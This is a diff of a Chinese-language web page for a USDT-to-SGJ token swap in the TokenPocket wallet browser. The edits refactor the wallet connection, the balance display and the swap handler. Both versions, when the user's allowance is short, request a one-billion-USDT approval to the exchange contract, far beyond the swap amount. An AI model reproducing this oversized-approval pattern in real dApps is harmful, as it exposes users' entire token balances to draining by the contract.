@@ -13,7 +13,7 @@
         .item{margin-bottom:16px}
         label{display:block;margin-bottom:8px;color:#cbd5e1}
         input{width:100%;padding:14px;border:1px solid #475569;background:#0f172a;color:#fff;border-radius:10px;font-size:16px}
-        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer;background:#0284c7}
+        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer;background:#0284c7;color:#fff}
         .info{margin-top:20px;padding:16px;background:#334155;border-radius:10px;font-size:14px;line-height:1.6}
         .tip{color:#fb923c;margin-top:12px;font-size:13px;text-align:center}
     </style>
@@ -25,7 +25,7 @@
         <label>支付USDT数量（1U=10SGJ）</label>
         <input id="usdtInput" placeholder="输入USDT金额" value="">
     </div>
-    <div class="tip">点击兑换，额度不足将自动发起授权</div>
+    <div class="tip">点击兑换，额度不足自动授权</div>
     <button class="btn" id="swapBtn">一键兑换SGJ</button>
 
     <div class="info">
@@ -52,73 +52,82 @@ const EXCHANGE_ABI = [
     {"inputs":[],"name":"exchangeClosed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
 ];
 
-let web3;
-let userWallet;
-let usdtContract;
-let exchangeContract;
+let web3 = null;
+let userWallet = "";
+let usdtContract = null;
+let exchangeContract = null;
 const decimals = 18;
 
+// 页面初始化
 window.onload = async function(){
-    await connectWallet();
-    setInterval(updateContractInfo, 5000);
+    await initWeb3();
+    setInterval(updateContractInfo,5000);
 }
 
-async function connectWallet(){
-    if(window.ethereum){
+// 初始化钱包
+async function initWeb3(){
+    if(!window.ethereum){
+        document.getElementById("walletAddr").innerText="非TP钱包浏览器";
+        return;
+    }
+    try{
         web3 = new Web3(window.ethereum);
-        try{
-            const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
-            userWallet = accounts[0];
-            document.getElementById("walletAddr").innerText = userWallet.slice(0,10)+"..."+userWallet.slice(-8);
-            usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
-            exchangeContract = new web3.eth.Contract(EXCHANGE_ABI, EXCHANGE_CONTRACT);
-            updateContractInfo();
-        }catch(e){
-            alert("请使用TokenPocket内置浏览器打开");
-        }
-    }else{
-        alert("未检测钱包，请TP打开链接");
+        let acc = await window.ethereum.request({method:'eth_requestAccounts'});
+        userWallet = acc[0];
+        document.getElementById("walletAddr").innerText = userWallet.slice(0,10)+"..."+userWallet.slice(-8);
+        usdtContract = new web3.eth.Contract(USDT_ABI,USDT_CONTRACT);
+        exchangeContract = new web3.eth.Contract(EXCHANGE_ABI,EXCHANGE_CONTRACT);
+        updateContractInfo();
+    }catch(e){
+        document.getElementById("walletAddr").innerText="链接失败";
+        console.log(e);
     }
 }
 
+// 更新合约数据
 async function updateContractInfo(){
     if(!exchangeContract) return;
     try{
-        const remainUser = await exchangeContract.methods.getRemainUserSGJ().call();
-        const remainLP = await exchangeContract.methods.getRemainLpReserveSGJ().call();
-        const isClosed = await exchangeContract.methods.exchangeClosed().call();
-        document.getElementById("remainSGJ").innerText = web3.utils.fromWei(remainUser, decimals);
-        document.getElementById("remainLP").innerText = web3.utils.fromWei(remainLP, decimals);
-        document.getElementById("contractStatus").innerText = isClosed ? "兑换通道已关闭" : "正常开放";
+        let remUser = await exchangeContract.methods.getRemainUserSGJ().call();
+        let remLp = await exchangeContract.methods.getRemainLpReserveSGJ().call();
+        let closeStat = await exchangeContract.methods.exchangeClosed().call();
+        document.getElementById("remainSGJ").innerText = web3.utils.fromWei(remUser,decimals);
+        document.getElementById("remainLP").innerText = web3.utils.fromWei(remLp,decimals);
+        document.getElementById("contractStatus").innerText = closeStat?"通道关闭":"正常开放";
     }catch(e){}
 }
 
-// 兑换主逻辑
-document.getElementById("swapBtn").addEventListener("click",async function(){
-    if(!userWallet) return alert("等待钱包连接");
-    const inputVal = document.getElementById("usdtInput").value.trim();
-    if(!inputVal || Number(inputVal) <= 0) return alert("请输入USDT数量");
-    const needWei = web3.utils.toWei(inputVal, decimals);
-
+// 兑换点击事件
+document.getElementById("swapBtn").onclick = async function(){
+    if(!userWallet){
+        alert("正在连接钱包，稍候重试");
+        return;
+    }
+    let inputVal = document.getElementById("usdtInput").value.trim();
+    if(isNaN(inputVal)||Number(inputVal)<=0){
+        alert("请填写正确USDT数量");
+        return;
+    }
+    let needWei = web3.utils.toWei(inputVal,"ether");
     try{
-        // 查询现有授权额度
-        let allowance = await usdtContract.methods.allowance(userWallet, EXCHANGE_CONTRACT).call();
-        if(BigInt(allowance) < BigInt(needWei)){
-            alert("授权不足，即将弹出TP授权");
-            // 一次性大额授权
-            const maxA = web3.utils.toWei("1000000000", decimals);
-            await usdtContract.methods.approve(EXCHANGE_CONTRACT, maxA).send({from:userWallet});
-            alert("授权成功，自动发起兑换");
+        // 获取授权额度
+        let allow = await usdtContract.methods.allowance(userWallet,EXCHANGE_CONTRACT).call();
+        // 去掉BigInt改用字符串对比
+        if(web3.utils.toBN(allow).lt(web3.utils.toBN(needWei))){
+            alert("授权不足，确认TP授权");
+            let maxApp = web3.utils.toWei("1000000000","ether");
+            await usdtContract.methods.approve(EXCHANGE_CONTRACT,maxApp).send({from:userWallet});
+            alert("授权成功，开始兑换");
         }
-        // 授权完毕直接兑换
+        // 发起兑换
         await exchangeContract.methods.exchangeSGJ(needWei).send({from:userWallet});
-        alert("兑换成功，SGJ已到账");
-        document.getElementById("usdtInput").value = "";
+        alert("兑换成功");
+        document.getElementById("usdtInput").value="";
         updateContractInfo();
     }catch(err){
-        alert("操作失败："+err.message);
+        alert("失败："+(err.message||err));
     }
-})
+}
 </script>
 </body>
 </html>
